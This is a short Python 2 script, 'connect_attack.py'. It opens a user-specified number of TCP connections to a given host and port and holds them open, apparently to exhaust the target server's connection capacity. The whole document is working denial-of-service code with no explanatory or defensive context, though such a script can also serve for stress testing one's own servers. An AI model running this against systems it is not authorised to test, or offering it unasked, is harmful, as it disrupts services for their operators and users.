#!/usr/bin/python
import sys
import socket
import time

if len(sys.argv) != 4 :
    print 'usage: connect_attack.py <host> <port> <n_connections'
    print 'args specified: ' + str(len(sys.argv))
    sys.exit(1)

host=sys.argv[1]
port=int(sys.argv[2])
connections = int(sys.argv[3])

print 'Starting connection attack'

sock = []
for i in range(0,connections) :
    #print 'Connection ' + str(i)
    sock.append( socket.socket(socket.AF_INET, socket.SOCK_STREAM))
    sock[i].connect((host,port))
    #time.sleep(0.1)
    sock[i].recv(4096)

sys.exit(0) # success

